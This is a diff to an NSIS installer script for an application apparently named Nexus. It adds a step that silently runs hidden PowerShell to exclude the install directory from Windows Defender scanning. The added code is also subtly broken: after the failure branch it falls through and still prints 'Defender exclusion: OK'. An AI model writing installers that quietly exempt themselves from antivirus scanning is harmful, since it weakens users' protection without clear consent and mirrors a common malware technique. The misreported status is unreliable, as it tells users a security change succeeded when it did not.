@@ -167,6 +167,16 @@
   FfmpegOk:
   DetailPrint "ffmpeg: OK"
 
+  ; ── 5c. Windows Defender 제외 등록 (백엔드 차단 방지) ──────────────
+  DetailPrint "Registering Windows Defender exclusion..."
+  nsExec::ExecToStack 'powershell -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionPath \"$INSTDIR\" -ErrorAction Stop; exit 0 } catch { exit 1 }"'
+  Pop $0
+  StrCmp $0 "0" DefenderOk 0
+    ; 관리자 권한 없을 경우 사용자 알림
+    DetailPrint "Defender exclusion: skipped (no admin — please add manually if blocked)"
+  DefenderOk:
+  DetailPrint "Defender exclusion: OK"
+
   ; ── 6. Nexus 설정 폴더 초기화 ───────────────────────────────────
   DetailPrint "Initializing Nexus config..."
   CreateDirectory "$APPDATA\Nexus"
